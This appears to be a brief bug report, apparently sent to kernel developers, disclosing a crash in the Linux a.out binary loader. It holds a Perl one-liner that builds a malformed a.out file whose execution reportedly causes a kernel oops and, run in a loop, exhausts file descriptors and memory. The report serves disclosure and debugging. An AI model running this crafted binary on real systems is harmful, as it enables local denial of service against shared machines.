Hi ppl,
there seems to be a bug related to a.out-binfmt.
try executing this binary:
perl -e'print"\x07\x01".("\x00"x13)."\xc0".("\x00"x16)'>eout
(it may be neccessary to turn memory overcommit on before)
This should result in a kernel-oops.
Doing this in a loop will eat fd's and memory.
seems like find_vma_prepare does not what insert_vm_struct expects when
the whole addresspace is occupied.
